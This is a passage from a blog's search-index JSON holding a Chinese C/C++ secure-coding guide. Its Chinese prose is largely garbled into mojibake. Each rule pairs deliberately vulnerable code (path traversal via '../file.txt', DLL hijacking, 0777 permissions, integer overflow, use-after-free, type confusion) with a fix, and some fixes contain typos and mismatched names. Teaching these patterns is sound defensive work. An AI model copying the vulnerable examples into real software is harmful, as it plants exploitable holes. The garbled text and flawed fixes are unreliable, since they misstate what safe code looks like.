å­¦å®‰å…¨çš„åº“é‡Œçš„éšæœºæ•°å‘ç”Ÿå™¨ã€‚ å…³è”æ¼æ´: é«˜é£é™©-æ•æ„Ÿæ•°æ®æ³„éœ² 4.5 ã€å¿…é¡»ã€‘è‡ªå·±å®ç°çš„randèŒƒå›´ä¸åº”è¿‡å° å¦‚æœåœ¨å¼±å®‰å…¨åœºæ™¯ç›¸å…³çš„ç®—æ³•ä¸­è‡ªå·±å®ç°äº†PRNGï¼Œè¯·ç¡®ä¿randå‡ºæ¥çš„éšæœºæ•°ä¸ä¼šå¾ˆå°æˆ–å¯é¢„æµ‹ã€‚ // Bad int32_t val = ((state[0] * 1103515245U) + 12345U) \u0026 999999; ä¸Šè¿°ä¾‹å­å¯èƒ½æƒ³ç”Ÿæˆ0~999999å…±100ä¸‡ç§å¯èƒ½çš„éšæœºæ•°ï¼Œä½†æ˜¯999999çš„äºŒè¿›åˆ¶æ˜¯11110100001000111111ï¼Œä¸\u0026è¿ç®—åï¼Œ0ä½ä¸€ç›´æ˜¯0ï¼Œæ‰€ä»¥ç”Ÿæˆå‡ºçš„èŒƒå›´æ˜æ˜¾ä¼šå°äº100ä¸‡ç§ã€‚ // Good int32_t val = ((state[0] * 1103515245U) + 12345U) % 1000000; // Good int32_t val = ((state[0] * 1103515245U) + 12345U) \u0026 0x7fffffff; å…³è”æ¼æ´: é«˜é£é™©-é€»è¾‘æ¼æ´ ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/:1:4","tags":["Coding","C/C++"],"title":"é€šç”¨å®‰å…¨ç¼–ç æŒ‡å— -- C/C++ ç¯‡","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/"},{"categories":["Development"],"content":"5 æ–‡ä»¶æ“ä½œ 5.1 ã€å¿…é¡»ã€‘é¿å…è·¯å¾„ç©¿è¶Šé—®é¢˜ åœ¨è¿›è¡Œæ–‡ä»¶æ“ä½œæ—¶ï¼Œéœ€è¦åˆ¤æ–­å¤–éƒ¨ä¼ å…¥çš„æ–‡ä»¶åæ˜¯å¦åˆæ³•ï¼Œå¦‚æœæ–‡ä»¶åä¸­åŒ…å« ../ ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™ä¼šé€ æˆè·¯å¾„ç©¿è¶Šï¼Œå¯¼è‡´ä»»æ„æ–‡ä»¶çš„è¯»å†™ã€‚ é”™è¯¯ï¼š void Foo() { char file_path[PATH_MAX] = \"/home/user/code/\"; // å¦‚æœä¼ å…¥çš„æ–‡ä»¶ååŒ…å«../å¯å¯¼è‡´è·¯å¾„ç©¿è¶Š // ä¾‹å¦‚\"../file.txt\"ï¼Œåˆ™å¯ä»¥è¯»å–åˆ°ä¸Šå±‚ç›®å½•çš„file.txtæ–‡ä»¶ char name[20] = \"../file.txt\"; memcpy(file_path + strlen(file_path), name, sizeof(name)); int fd = open(file_path, O_RDONLY); if (fd != -1) { char data[100] = {0}; int num = 0; memset(data, 0, sizeof(data)); num = read(fd, data, sizeof(data)); if (num \u003e 0) { write(STDOUT_FILENO, data, num); } close(fd); } } æ­£ç¡®ï¼š void Foo() { char file_path[PATH_MAX] = \"/home/user/code/\"; char name[20] = \"../file.txt\"; // åˆ¤æ–­ä¼ å…¥çš„æ–‡ä»¶åæ˜¯å¦éæ³•ï¼Œä¾‹å¦‚\"../file.txt\"ä¸­åŒ…å«éæ³•å­—ç¬¦../ï¼Œç›´æ¥è¿”å› if (strstr(name, \"..\") != NULL){ // åŒ…å«éæ³•å­—ç¬¦ return; } memcpy(file_path + strlen(file_path), name, sizeof(name)); int fd = open(file_path, O_RDONLY); if (fd != -1) { char data[100] = {0}; int num = 0; memset(data, 0, sizeof(data)); num = read(fd, data, sizeof(data)); if (num \u003e 0) { write(STDOUT_FILENO, data, num); } close(fd); } } å…³è”æ¼æ´: é«˜é£é™©-é€»è¾‘æ¼æ´ 5.2 ã€å¿…é¡»ã€‘é¿å…ç›¸å¯¹è·¯å¾„å¯¼è‡´çš„å®‰å…¨é—®é¢˜ï¼ˆDLLã€EXEåŠ«æŒç­‰é—®é¢˜ï¼‰ åœ¨ç¨‹åºä¸­ï¼Œä½¿ç”¨ç›¸å¯¹è·¯å¾„å¯èƒ½å¯¼è‡´ä¸€äº›å®‰å…¨é£é™©ï¼Œä¾‹å¦‚DLLã€EXEåŠ«æŒç­‰é—®é¢˜ã€‚ ä¾‹å¦‚ä»¥ä¸‹ä»£ç ï¼Œå¯èƒ½å­˜åœ¨åŠ«æŒé—®é¢˜ï¼š int Foo() { // ä¼ å…¥çš„æ˜¯dllæ–‡ä»¶åï¼Œå¦‚æœå½“å‰ç›®å½•ä¸‹è¢«å†™å…¥äº†æ¶æ„çš„åŒådllï¼Œåˆ™å¯èƒ½å¯¼è‡´dllåŠ«æŒ HINSTANCE hinst = ::LoadLibrary(\"dll_nolib.dll\"); if (hinst != NULL) { cout\u003c\u003c\"dll loaded!\" \u003c\u003c endl; } return 0; } é’ˆå¯¹DLLåŠ«æŒçš„å®‰å…¨ç¼–ç çš„è§„èŒƒï¼š 1ï¼‰è°ƒç”¨LoadLibraryï¼ŒLoadLibraryExï¼ŒCreateProcessï¼ŒShellExecuteç­‰è¿›è¡Œæ¨¡å—åŠ è½½çš„å‡½æ•°æ—¶ï¼ŒæŒ‡æ˜æ¨¡å—çš„å®Œæ•´ï¼ˆå…¨ï¼‰è·¯å¾„ï¼Œç¦æ­¢ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œè¿™æ ·å°±å¯é¿å…ä»å…¶å®ƒç›®å½•åŠ è½½DLLã€‚ 2ï¼‰åœ¨åº”ç”¨ç¨‹åºçš„å¼€å¤´è°ƒç”¨SetDllDirectory(TEXT(\"\")); ä»è€Œå°†å½“å‰ç›®å½•ä»DLLçš„æœç´¢åˆ—è¡¨ä¸­åˆ é™¤ã€‚ç»“åˆSetDefaultDllDirectoriesï¼ŒAddDllDirectoryï¼ŒRemoveDllDirectoryè¿™å‡ ä¸ªAPIé…åˆä½¿ç”¨ï¼Œå¯ä»¥æœ‰æ•ˆçš„è§„é¿DLLåŠ«æŒé—®é¢˜ã€‚è¿™äº›APIåªèƒ½åœ¨æ‰“äº†KB2533623è¡¥ä¸çš„Windows7ï¼Œ2008ä¸Šä½¿ç”¨ã€‚ å…³è”æ¼æ´: ä¸­é£é™©-é€»è¾‘æ¼æ´ 5.3 ã€å¿…é¡»ã€‘æ–‡ä»¶æƒé™æ§åˆ¶ åœ¨åˆ›å»ºæ–‡ä»¶æ—¶ï¼Œéœ€è¦æ ¹æ®æ–‡ä»¶çš„æ•æ„Ÿçº§åˆ«è®¾ç½®ä¸åŒçš„è®¿é—®æƒé™ï¼Œä»¥é˜²æ­¢æ•æ„Ÿæ•°æ®è¢«å…¶ä»–æ¶æ„ç¨‹åºè¯»å–æˆ–å†™å…¥ã€‚ é”™è¯¯ï¼š int Foo() { // ä¸è¦è®¾ç½®ä¸º777æƒé™ï¼Œä»¥é˜²æ­¢è¢«å…¶ä»–æ¶æ„ç¨‹åºæ“ä½œ if (creat(\"file.txt\", 0777) \u003c 0) { printf(\"æ–‡ä»¶åˆ›å»ºå¤±è´¥ï¼\\n\"); } else { printf(\"æ–‡ä»¶åˆ›å»ºæˆåŠŸï¼\\n\"); } return 0; } å…³è”æ¼æ´: ä¸­é£é™©-é€»è¾‘æ¼æ´ ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/:1:5","tags":["Coding","C/C++"],"title":"é€šç”¨å®‰å…¨ç¼–ç æŒ‡å— -- C/C++ ç¯‡","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/"},{"categories":["Development"],"content":"6 å†…å­˜æ“ä½œ 6.1 ã€å¿…é¡»ã€‘é˜²æ­¢å„ç§è¶Šç•Œå†™ï¼ˆå‘å‰/å‘åï¼‰ é”™è¯¯1ï¼š int a[5]; a[5] = 0; é”™è¯¯2ï¼š int a[5]; int b = user_controlled_value; a[b] = 3; å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å 6.2 ã€å¿…é¡»ã€‘é˜²æ­¢ä»»æ„åœ°å€å†™ ä»»æ„åœ°å€å†™ä¼šå¯¼è‡´ä¸¥é‡çš„å®‰å…¨éšæ‚£ï¼Œå¯èƒ½å¯¼è‡´ä»£ç æ‰§è¡Œã€‚å› æ­¤ï¼Œåœ¨ç¼–ç æ—¶å¿…é¡»æ ¡éªŒå†™å…¥çš„åœ°å€ã€‚ é”™è¯¯ï¼š void Write(MyStruct dst_struct) { char payload[10] = { 0 }; memcpy(dst_struct.buf, payload, sizeof(payload)); } int main() { MyStruct dst_stuct; dst_stuct.buf = (char*)user_controlled_value; Write(dst_stuct); return 0; } å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/:1:6","tags":["Coding","C/C++"],"title":"é€šç”¨å®‰å…¨ç¼–ç æŒ‡å— -- C/C++ ç¯‡","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/"},{"categories":["Development"],"content":"7 æ•°å­—æ“ä½œ 7.1 ã€å¿…é¡»ã€‘é˜²æ­¢æ•´æ•°æº¢å‡º åœ¨è®¡ç®—æ—¶éœ€è¦è€ƒè™‘æ•´æ•°æº¢å‡ºçš„å¯èƒ½ï¼Œå°¤å…¶åœ¨è¿›è¡Œå†…å­˜æ“ä½œæ—¶ï¼Œéœ€è¦å¯¹åˆ†é…ã€æ‹·è´ç­‰å¤§å°è¿›è¡Œåˆæ³•æ ¡éªŒï¼Œé˜²æ­¢æ•´æ•°æº¢å‡ºå¯¼è‡´çš„æ¼æ´ã€‚ é”™è¯¯ï¼ˆè¯¥ä¾‹å­åœ¨è®¡ç®—æ—¶äº§ç”Ÿæ•´æ•°æº¢å‡ºï¼‰ const kMicLen = 4; // æ•´æ•°æº¢å‡º void Foo() { int len = 1; char payload[10] = { 0 }; char dst[10] = { 0 }; // Bad, ç”±äºlenå°äº4å­—èŠ‚ï¼Œå¯¼è‡´è®¡ç®—æ‹·è´é•¿åº¦æ—¶ï¼Œæ•´æ•°æº¢å‡º // len - MIC_LEN == 0xfffffffd memcpy(dst, payload, len - kMicLen); } æ­£ç¡®ä¾‹å­ void Foo() { int len = 1; char payload[10] = { 0 }; char dst[10] = { 0 }; int size = len - kMicLen; // æ‹·è´å‰å¯¹é•¿åº¦è¿›è¡Œåˆ¤æ–­ if (size \u003e 0 \u0026\u0026 size \u003c 10) { memcpy(dst, payload, size); printf(\"memcpy good\\n\"); } } å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å 7.2 ã€å¿…é¡»ã€‘é˜²æ­¢Off-By-One åœ¨è¿›è¡Œè®¡ç®—æˆ–è€…æ“ä½œæ—¶ï¼Œå¦‚æœä½¿ç”¨çš„æœ€å¤§å€¼æˆ–æœ€å°å€¼ä¸æ­£ç¡®ï¼Œä½¿å¾—è¯¥å€¼æ¯”æ­£ç¡®å€¼å¤š1æˆ–å°‘1ï¼Œå¯èƒ½å¯¼è‡´å®‰å…¨é£é™©ã€‚ é”™è¯¯ï¼š char firstname[20]; char lastname[20]; char fullname[40]; fullname[0] = '\\0'; strncat(fullname, firstname, 20); // ç¬¬äºŒæ¬¡è°ƒç”¨strncat()å¯èƒ½ä¼šè¿½åŠ å¦å¤–20ä¸ªå­—ç¬¦ã€‚å¦‚æœè¿™20ä¸ªå­—ç¬¦æ²¡æœ‰ç»ˆæ­¢ç©ºå­—ç¬¦ï¼Œåˆ™å­˜åœ¨å®‰å…¨é—®é¢˜ strncat(fullname, lastname, 20); æ­£ç¡®ï¼š char firstname[20]; char lastname[20]; char fullname[40]; fullname[0] = '\\0'; // å½“ä½¿ç”¨åƒstrncat()å‡½æ•°æ—¶ï¼Œå¿…é¡»åœ¨ç¼“å†²åŒºçš„æœ«å°¾ä¸ºç»ˆæ­¢ç©ºå­—ç¬¦ç•™ä¸‹ä¸€ä¸ªç©ºå­—èŠ‚ï¼Œé¿å…off-by-one strncat(fullname, firstname, sizeof(fullname) - strlen(fullname) - 1); strncat(fullname, lastname, sizeof(fullname) - strlen(fullname) - 1); å¯¹äº C++ ä»£ç ï¼Œå†æ¬¡å¼ºçƒˆå»ºè®®ä½¿ç”¨ stringã€vector ç­‰ç»„ä»¶ä»£æ›¿åŸå§‹æŒ‡é’ˆå’Œæ•°ç»„æ“ä½œã€‚ å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å 7.3 ã€å¿…é¡»ã€‘é¿å…å¤§å°ç«¯é”™è¯¯ åœ¨ä¸€äº›æ¶‰åŠå¤§å°ç«¯æ•°æ®å¤„ç†çš„åœºæ™¯ï¼Œéœ€è¦è¿›è¡Œå¤§å°ç«¯åˆ¤æ–­ï¼Œä¾‹å¦‚ä»å¤§æ®µè®¾å¤‡å–å‡ºçš„å€¼ï¼Œè¦ä»¥å¤§æ®µè¿›è¡Œå¤„ç†ï¼Œé¿å…ç«¯åºé”™è¯¯ä½¿ç”¨ã€‚ å…³è”æ¼æ´: ä¸­é£é™©-é€»è¾‘æ¼æ´ 7.4 ã€å¿…é¡»ã€‘æ£€æŸ¥é™¤ä»¥é›¶å¼‚å¸¸ åœ¨è¿›è¡Œé™¤æ³•è¿ç®—æ—¶ï¼Œéœ€è¦åˆ¤æ–­è¢«é™¤æ•°æ˜¯å¦ä¸ºé›¶ï¼Œä»¥é˜²å¯¼è‡´ç¨‹åºä¸ç¬¦åˆé¢„æœŸæˆ–è€…å´©æºƒã€‚ é”™è¯¯ï¼š double divide(double x, double y) { return x / y; } int divide(int x, int y) { return x / y; } æ­£ç¡®ï¼š double divide(double x, double y) { if (y == 0) { throw DivideByZero; } return x / y; } å…³è”æ¼æ´: ä½é£é™©-æ‹’ç»æœåŠ¡ 7.5 ã€å¿…é¡»ã€‘é˜²æ­¢æ•°å­—ç±»å‹çš„é”™è¯¯å¼ºè½¬ åœ¨æœ‰ç¬¦å·å’Œæ— ç¬¦å·æ•°å­—å‚ä¸çš„è¿ç®—ä¸­ï¼Œéœ€è¦æ³¨æ„ç±»å‹å¼ºè½¬å¯èƒ½å¯¼è‡´çš„é€»è¾‘é”™è¯¯ï¼Œå»ºè®®æŒ‡å®šå‚ä¸è®¡ç®—æ—¶æ•°å­—çš„ç±»å‹æˆ–è€…ç»Ÿä¸€ç±»å‹å‚ä¸è®¡ç®—ã€‚ é”™è¯¯ä¾‹å­ int Foo() { int len = 1; unsigned int size = 9; // 1 \u003c 9 - 10 ? ç”±äºè¿ç®—ä¸­æ— ç¬¦å·å’Œæœ‰ç¬¦å·æ··ç”¨ï¼Œå¯¼è‡´è®¡ç®—ç»“æœä»¥æ— ç¬¦å·è®¡ç®— if (len \u003c size - 10) { printf(\"Bad\\n\"); } else { printf(\"Good\\n\"); } } æ­£ç¡®ä¾‹å­ void Foo() { // ç»Ÿä¸€ä¸¤è€…è®¡ç®—ç±»å‹ä¸ºæœ‰ç¬¦å· int len = 1; int size = 9; if (len \u003c size - 10) { printf(\"Bad\\n\"); } else { printf(\"Good\\n\"); } } å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å ä¸­é£é™©-é€»è¾‘æ¼æ´ 7.6 ã€å¿…é¡»ã€‘æ¯”è¾ƒæ•°æ®å¤§å°æ—¶åŠ ä¸Šæœ€å°/æœ€å¤§å€¼çš„æ ¡éªŒ åœ¨è¿›è¡Œæ•°æ®å¤§å°æ¯”è¾ƒæ—¶ï¼Œè¦åˆç†åœ°æ ¡éªŒæ•°æ®çš„åŒºé—´èŒƒå›´ï¼Œå»ºè®®æ ¹æ®æ•°å­—ç±»å‹ï¼Œå¯¹å…¶è¿›è¡Œæœ€å¤§å’Œæœ€å°å€¼çš„åˆ¤æ–­ï¼Œä»¥é˜²æ­¢éé¢„æœŸé”™è¯¯ã€‚ é”™è¯¯ï¼š void Foo(int index) { int a[30] = {0}; // æ­¤å¤„indexæ˜¯intå‹ï¼Œåªè€ƒè™‘äº†indexå°äºæ•°ç»„å¤§å°ï¼Œä½†æ˜¯å¹¶æœªåˆ¤æ–­æ˜¯å¦å¤§äº0 if (index \u003c 30) { // å¦‚æœindexä¸ºè´Ÿæ•°ï¼Œåˆ™è¶Šç•Œ a[index] = 1; } } æ­£ç¡®ï¼š void Foo(int index) { int a[30] = {0}; // åˆ¤æ–­indexçš„æœ€å¤§æœ€å°å€¼ if (index \u003e=0 \u0026\u0026 index \u003c 30) { a[index] = 1; } } å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/:1:7","tags":["Coding","C/C++"],"title":"é€šç”¨å®‰å…¨ç¼–ç æŒ‡å— -- C/C++ ç¯‡","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/"},{"categories":["Development"],"content":"8 æŒ‡é’ˆæ“ä½œ 8.1 ã€å»ºè®®ã€‘æ£€æŸ¥åœ¨pointerä¸Šä½¿ç”¨sizeof é™¤äº†æµ‹è¯•å½“å‰æŒ‡é’ˆé•¿åº¦ï¼Œå¦åˆ™ä¸€èˆ¬ä¸ä¼šåœ¨pointerä¸Šä½¿ç”¨sizeofã€‚ æ­£ç¡®ï¼š size_t pointer_length = sizeof(void*); å¯èƒ½é”™è¯¯ï¼š size_t structure_length = sizeof(Foo*); å¯èƒ½æ˜¯ï¼š size_t structure_length = sizeof(Foo); å…³è”æ¼æ´: ä¸­é£é™©-é€»è¾‘æ¼æ´ 8.2 ã€å¿…é¡»ã€‘æ£€æŸ¥ç›´æ¥å°†æ•°ç»„å’Œ0æ¯”è¾ƒçš„ä»£ç  é”™è¯¯ï¼š int a[3]; ...; if (a \u003e 0) ...; è¯¥åˆ¤æ–­æ°¸è¿œä¸ºçœŸï¼Œç­‰ä»·äº: int a[3]; ...; if (\u0026a[0]) ...; å¯èƒ½æ˜¯ï¼š int a[3]; ...; if(a[0] \u003e 0) ...; å¼€å¯è¶³å¤Ÿçš„ç¼–è¯‘å™¨è­¦å‘Šï¼ˆGCC ä¸­ä¸º -Waddressï¼Œå¹¶å·²åŒ…å«åœ¨ -Wall ä¸­ï¼‰ï¼Œå¹¶è®¾ç½®ä¸ºé”™è¯¯ï¼Œå¯ä»¥åœ¨ç¼–è¯‘æœŸé—´å‘ç°è¯¥é—®é¢˜ã€‚ å…³è”æ¼æ´: ä¸­é£é™©-é€»è¾‘æ¼æ´ 8.3 ã€å¿…é¡»ã€‘ä¸åº”å½“å‘æŒ‡é’ˆèµ‹äºˆå†™æ­»çš„åœ°å€ ç‰¹æ®Šæƒ…å†µéœ€è¦ç‰¹æ®Šå¯¹å¾…ï¼ˆæ¯”å¦‚å¼€å‘ç¡¬ä»¶å›ºä»¶æ—¶å¯èƒ½éœ€è¦å†™æ­»ï¼‰ ä½†æ˜¯å¦‚æœæ˜¯ç³»ç»Ÿé©±åŠ¨å¼€å‘ä¹‹ç±»çš„ï¼Œå†™æ­»å¯èƒ½ä¼šå¯¼è‡´åç»­çš„é—®é¢˜ã€‚ å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å 8.4 ã€å¿…é¡»ã€‘æ£€æŸ¥ç©ºæŒ‡é’ˆ é”™è¯¯ï¼š *foo = 100; if (!foo) { ERROR(\"foobar\"); } æ­£ç¡®ï¼š if (!foo) { ERROR(\"foobar\"); } *foo = 100; é”™è¯¯ï¼š void Foo(char* bar) { *bar = '\\0'; } æ­£ç¡®ï¼š void Foo(char* bar) { if(bar) *bar = '\\0'; else ...; } å…³è”æ¼æ´: ä½é£é™©-æ‹’ç»æœåŠ¡ 8.5 ã€å¿…é¡»ã€‘é‡Šæ”¾å®Œåç½®ç©ºæŒ‡é’ˆ åœ¨å¯¹æŒ‡é’ˆè¿›è¡Œé‡Šæ”¾åï¼Œéœ€è¦å°†è¯¥æŒ‡é’ˆè®¾ç½®ä¸ºNULLï¼Œä»¥é˜²æ­¢åç»­freeæŒ‡é’ˆçš„è¯¯ç”¨ï¼Œå¯¼è‡´UAFç­‰å…¶ä»–å†…å­˜ç ´åé—®é¢˜ã€‚å°¤å…¶æ˜¯åœ¨ç»“æ„ä½“ã€ç±»é‡Œé¢å­˜å‚¨çš„åŸå§‹æŒ‡é’ˆã€‚ é”™è¯¯ï¼š void foo() { char* p = (char*)malloc(100); memcpy(p, \"hello\", 6); // æ­¤æ—¶pæ‰€æŒ‡å‘çš„å†…å­˜å·²è¢«é‡Šæ”¾ï¼Œä½†æ˜¯pæ‰€æŒ‡çš„åœ°å€ä»ç„¶ä¸å˜ printf(\"%s\\n\", p); free(p); // æœªè®¾ç½®ä¸ºNULLï¼Œå¯èƒ½å¯¼è‡´UAFç­‰å†…å­˜é”™è¯¯ if (p != NULL) { // æ²¡æœ‰èµ·åˆ°é˜²é”™ä½œç”¨ printf(\"%s\\n\", p); // é”™è¯¯ä½¿ç”¨å·²ç»é‡Šæ”¾çš„å†…å­˜ } } æ­£ç¡®ï¼š void foo() { char* p = (char*)malloc(100); memcpy(p, \"hello\", 6); // æ­¤æ—¶pæ‰€æŒ‡å‘çš„å†…å­˜å·²è¢«é‡Šæ”¾ï¼Œä½†æ˜¯pæ‰€æŒ‡çš„åœ°å€ä»ç„¶ä¸å˜ printf(\"%s\\n\", p); free(p); //é‡Šæ”¾åå°†æŒ‡é’ˆèµ‹å€¼ä¸ºç©º p = NULL; if (p != NULL) { // æ²¡æœ‰èµ·åˆ°é˜²é”™ä½œç”¨ printf(\"%s\\n\", p); // é”™è¯¯ä½¿ç”¨å·²ç»é‡Šæ”¾çš„å†…å­˜ } } å¯¹äº C++ ä»£ç ï¼Œä½¿ç”¨ stringã€vectorã€æ™ºèƒ½æŒ‡é’ˆç­‰ä»£æ›¿åŸå§‹å†…å­˜ç®¡ç†æœºåˆ¶ï¼Œå¯ä»¥å¤§é‡å‡å°‘è¿™ç±»é”™è¯¯ã€‚ å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å 8.6 ã€å¿…é¡»ã€‘é˜²æ­¢é”™è¯¯çš„ç±»å‹è½¬æ¢ï¼ˆtype confusionï¼‰ åœ¨å¯¹æŒ‡é’ˆã€å¯¹è±¡æˆ–å˜é‡è¿›è¡Œæ“ä½œæ—¶ï¼Œéœ€è¦èƒ½å¤Ÿæ­£ç¡®åˆ¤æ–­æ‰€æ“ä½œå¯¹è±¡çš„åŸå§‹ç±»å‹ã€‚å¦‚æœä½¿ç”¨äº†ä¸åŸå§‹ç±»å‹ä¸å…¼å®¹çš„ç±»å‹è¿›è¡Œè®¿é—®ï¼Œåˆ™å­˜åœ¨å®‰å…¨éšæ‚£ã€‚ é”™è¯¯ï¼š const int NAME_TYPE = 1; const int ID_TYPE = 2; // è¯¥ç±»å‹æ ¹æ® msg_type è¿›è¡ŒåŒºåˆ†ï¼Œå¦‚æœåœ¨å¯¹MessageBufferè¿›è¡Œæ“ä½œæ—¶æ²¡æœ‰åˆ¤æ–­ç›®æ ‡å¯¹è±¡ï¼Œåˆ™å­˜åœ¨ç±»å‹æ··æ·† struct MessageBuffer { int msg_type; union { const char *name; int name_id; }; }; void Foo() { struct MessageBuffer buf; const char* default_message = \"Hello World\"; // è®¾ç½®è¯¥æ¶ˆæ¯ç±»å‹ä¸º NAME_TYPEï¼Œå› æ­¤bufé¢„æœŸçš„ç±»å‹ä¸º msg_type + name buf.msg_type = NAME_TYPE; buf.name = default_message; printf(\"Pointer of buf.name is %p\\n\", buf.name); // æ²¡æœ‰åˆ¤æ–­ç›®æ ‡æ¶ˆæ¯ç±»å‹æ˜¯å¦ä¸ºID_TYPEï¼Œç›´æ¥ä¿®æ”¹nameIDï¼Œå¯¼è‡´ç±»å‹æ··æ·† buf.name_id = user_controlled_value; if (buf.msg_type == NAME_TYPE) { printf(\"Pointer of buf.name is now %p\\n\", buf.name); // ä»¥NAME_TYPEä½œä¸ºç±»å‹æ“ä½œï¼Œå¯èƒ½å¯¼è‡´éæ³•å†…å­˜è¯»å†™ printf(\"Message: %s\\n\", buf.name); } else { printf(\"Message: Use ID %d\\n\", buf.name_id); } } æ­£ç¡®ï¼ˆåˆ¤æ–­æ“ä½œçš„ç›®æ ‡æ˜¯å¦æ˜¯é¢„æœŸç±»å‹ï¼‰ï¼š void Foo() { struct MessageBuffer buf; const char* default_message = \"Hello World\"; // è®¾ç½®è¯¥æ¶ˆæ¯ç±»å‹ä¸º NAME_TYPEï¼Œå› æ­¤bufé¢„æœŸçš„ç±»å‹ä¸º msg_type + name buf.msg_type = NAME_TYPE; buf.name = default_msessage; printf(\"Pointer of buf.name is %p\\n\", buf.name); // åˆ¤æ–­ç›®æ ‡æ¶ˆæ¯ç±»å‹æ˜¯å¦ä¸º ID_TYPEï¼Œä¸æ˜¯é¢„æœŸç±»å‹åˆ™åšå¯¹åº”æ“ä½œ if (buf.msg_type == ID_TYPE) buf.name_id = user_controlled_value; if (buf.msg_type == NAME_TYPE) { printf(\"Pointer of buf.name is now %p\\n\", buf.name); printf(\"Message: %s\\n\", buf.name); } else { printf(\"Message: Use ID %d\\n\", buf.name_id); } } å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å 8.7 ã€å¿…é¡»ã€‘æ™ºèƒ½æŒ‡é’ˆä½¿ç”¨å®‰å…¨ åœ¨ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆæ—¶ï¼Œé˜²æ­¢å…¶å’ŒåŸå§‹æŒ‡é’ˆçš„æ··ç”¨ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´å¯¹è±¡ç”Ÿå‘½å‘¨æœŸé—®é¢˜ï¼Œä¾‹å¦‚ UAF ç­‰å®‰å…¨é£é™©ã€‚ é”™è¯¯ä¾‹å­ï¼š class Foo { public: explicit Foo(int num) { data_ = num; }; void Function() { printf(\"Obj is %p, data = %d\\n\", this, data_); }; private: int data_; }; std::unique_ptr\u003cFoo\u003e fool_u_ptr = nullptr; Foo* pfool_raw_ptr = nullptr; void Risk() { fool_u_ptr = make_unique\u003cFoo\u003e(1); // ä»ç‹¬å æ™ºèƒ½æŒ‡é’ˆä¸­è·å–åŸå§‹æŒ‡é’ˆ,\u003cFoo\u003e(1) pfool_raw_ptr = fool_u_ptr.get(); // è°ƒç”¨\u003cFoo\u003e(1)çš„å‡½æ•° pfool_raw_ptr-\u003eFunction(); // ç‹¬å æ™ºèƒ½æŒ‡é’ˆé‡æ–°èµ‹å€¼åä¼šé‡Šæ”¾å†…å­˜ fool_u_ptr = make_unique\u003cFoo\u003e(2); // é€šè¿‡åŸå§‹æŒ‡é’ˆæ“ä½œä¼šå¯¼è‡´UAFï¼Œpfool_raw_ptræŒ‡å‘çš„å¯¹è±¡å·²ç»é‡Šæ”¾ pfool_raw_ptr-\u003eFunction(); } // è¾“å‡ºï¼š // Obj is 0000027943087B80, data = 1 // Obj is 0000027943087B80, data = -572662307 æ­£ç¡®ï¼Œé€šè¿‡æ™ºèƒ½æŒ‡é’ˆæ“ä½œ: void Safe() { fool_u_ptr = make_unique\u003cFoo\u003e(1); // è°ƒç”¨\u003cFoo\u003e(1)çš„å‡½æ•° fool_u_ptr-\u003efunction(); fool_u_ptr = make_unique\u003cFoo\u003e(2); // è°ƒç”¨\u003cFoo\u003e(2)çš„å‡½æ•° fool_u_ptr-\u003efunction(); } // è¾“å‡ºï¼š // Obj is 000002C7BB550830, data = 1 // Obj is 000002C7BB557AF0, data = 2 å…³è”æ¼æ´: é«˜é£é™©-å†…å­˜ç ´å ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/:1:8","tags":["Coding","C/C++"],"title":"é€šç”¨å®‰å…¨ç¼–ç æŒ‡å— -- C/C++ ç¯‡","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/"},{"categories":["Development"],"content":"å‚è€ƒé“¾æ¥ https://www.w3cschool.cn/secguide/secguide-ysdn3fk5.html ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/:2:0","tags":["Coding","C/C++"],"title":"é€šç”¨å®‰å…¨ç¼–ç æŒ‡å— -- C/C++ ç¯‡","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/"},{"categories":["CTF"],"content":"Linuxå¹³å°ä¸‹çš„CTF Pwnç¯å¢ƒæ­å»º","date":"2020-12-25","objectID":"/2020/12/pwn/","tags":["pwn"],"title":"Linuxå¹³å°ä¸‹çš„CTF 